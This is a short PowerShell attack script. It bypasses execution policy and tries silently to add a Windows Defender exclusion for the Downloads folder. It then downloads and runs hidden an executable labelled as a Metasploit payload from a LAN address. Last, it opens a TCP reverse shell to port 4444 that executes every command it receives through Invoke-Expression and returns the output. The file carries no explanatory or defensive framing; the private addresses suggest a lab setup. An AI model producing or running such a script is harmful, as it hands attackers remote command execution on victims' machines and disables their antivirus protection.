function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}

Ensure-WindowsPowerShell

try {
    # Attempt Defender Exclusion (will fail silently if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Download and execute metasploit exe ===
    try {
        $url = "http://192.168.0.100/framework.exe"
        $output = "$env:TEMP\framework.exe"
        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
        Start-Process -FilePath $output -WindowStyle Hidden
    }
    catch {
        # Ignore any errors here
    }

    # === Reverse shell setup ===
    $client = "192.168.0.114"
    $port = 4444

    $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $writer.Write($sendback2)
        $writer.Flush()
    }

    $writer.Close()
    $stream.Close()
    $tcp.Close()
}
catch {
    Write-Error "Execution failed: $_"
}
